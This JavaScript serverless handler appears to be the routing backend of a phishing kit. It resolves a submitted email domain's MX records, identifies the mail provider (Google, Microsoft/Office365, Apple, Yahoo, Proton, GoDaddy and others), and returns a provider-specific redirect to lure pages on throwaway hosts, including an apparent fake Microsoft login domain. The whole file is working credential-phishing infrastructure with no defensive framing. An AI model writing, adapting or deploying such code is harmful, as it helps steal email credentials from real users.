// api/detect.js
import dns from 'dns';
import { promisify } from 'util';

// =============================================
// 🔧 DNS timeout: 7 seconds
// =============================================
const DNS_TIMEOUT = 7000;

function resolveMxWithTimeout(domain, timeout = DNS_TIMEOUT) {
    return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            reject(new Error(`DNS lookup timeout for ${domain} after ${timeout}ms`));
        }, timeout);

        dns.resolveMx(domain, (err, result) => {
            clearTimeout(timer);
            if (err) {
                reject(err);
            } else {
                resolve(result);
            }
        });
    });
}

// =============================================
// 🔑 REDIRECT RULES (same as before)
// =============================================

const REDIRECT_RULES = {
    'google': {
        keywords: ['google.com', 'googlemail.com', 'google'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/gb/main.html'
    },
    'microsoft': {
        keywords: ['outlook.com', 'office365.com', 'microsoft.com', 'protection.outlook.com'],
        url: 'https://login.chnl-stat-eu75ow.cyou'
    },
    'office365': {
        keywords: ['mail.protection.outlook.com', 'olc.protection.outlook.com'],
        url: 'https://login.chnl-stat-eu75ow.cyou'
    },
    'apple': {
        keywords: ['icloud.com', 'apple.com'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
    },
    'yahoo': {
        keywords: ['yahoo.com', 'yahoodns.net'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/eu/main.html'
    },
    'zoho': {
        keywords: ['zoho.com', 'zohomail.com'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
    },
    'protonmail': {
        keywords: ['protonmail.com', 'protonmail.ch', 'proton.me'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
    },
    'fastmail': {
        keywords: ['fastmail.com', 'fastmail.fm'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
    },
    'amazon': {
        keywords: ['amazonaws.com', 'ses.amazonaws.com'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
    },
    'godaddy': {
        keywords: ['secureserver.net', 'godaddy.com'],
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/en/main.html'
    },
    'default': {
        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'  // CHANGE THIS
    }
};

// =============================================
// 🧠 DETECTION LOGIC
// =============================================

function detectProvider(mxRecords) {
    const allHosts = mxRecords
        .map(record => record.exchange || record.hostname || record.host || '')
        .join(' ')
        .toLowerCase();

    for (const [providerName, rule] of Object.entries(REDIRECT_RULES)) {
        if (providerName === 'default') continue;
        for (const keyword of rule.keywords) {
            if (allHosts.includes(keyword.toLowerCase())) {
                return providerName;
            }
        }
    }
    return 'default';
}

function getRedirectUrl(provider, domain) {
    const rule = REDIRECT_RULES[provider] || REDIRECT_RULES.default;
    return rule.url;
}

// =============================================
// 🚀 API HANDLER
// =============================================

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false,
            error: 'Method not allowed. Use POST.'
        });
    }

    try {
        const { email, domain } = req.body;

        if (!domain) {
            return res.status(400).json({ 
                success: false,
                error: 'Domain is required' 
            });
        }

        // =============================================
        // 🔧 FIXED: Allow multiple dots (e.g., .com.tr, .co.uk)
        // =============================================
        const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-.]*\.[a-zA-Z]{2,}$/;
        if (!domainRegex.test(domain)) {
            console.log(`❌ Invalid domain format: ${domain}`);
            return res.status(200).json({
                success: true,
                domain: domain,
                provider: 'default',
                redirectUrl: REDIRECT_RULES.default.url,
                message: 'Invalid domain format, using default.',
                mxRecords: []
            });
        }

        console.log(`🔍 Checking domain: ${domain}`);

        let mxRecords = [];
        let dnsError = null;

        try {
            mxRecords = await resolveMxWithTimeout(domain, DNS_TIMEOUT);
            mxRecords.sort((a, b) => a.priority - b.priority);
            console.log(`✅ MX records:`, mxRecords.map(r => r.exchange));
        } catch (error) {
            dnsError = error;
            console.error(`❌ DNS lookup failed:`, error.message);
        }

        if (dnsError || mxRecords.length === 0) {
            // Return default URL instead of error
            return res.status(200).json({
                success: true,
                domain: domain,
                provider: 'default',
                redirectUrl: REDIRECT_RULES.default.url,
                message: dnsError ? `DNS issue: ${dnsError.message}` : 'No MX records',
                mxRecords: []
            });
        }

        const provider = detectProvider(mxRecords);
        const redirectUrl = getRedirectUrl(provider, domain);

        console.log(`✅ ${domain} -> ${provider}`);

        return res.status(200).json({
            success: true,
            domain: domain,
            provider: provider,
            redirectUrl: redirectUrl,
            mxRecords: mxRecords.slice(0, 10).map(r => ({
                priority: r.priority,
                exchange: r.exchange
            })),
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Unexpected error:', error);
        return res.status(200).json({
            success: true,
            provider: 'default',
            redirectUrl: REDIRECT_RULES.default.url,
            message: 'Fallback due to error',
            error: error.message
        });
    }
}
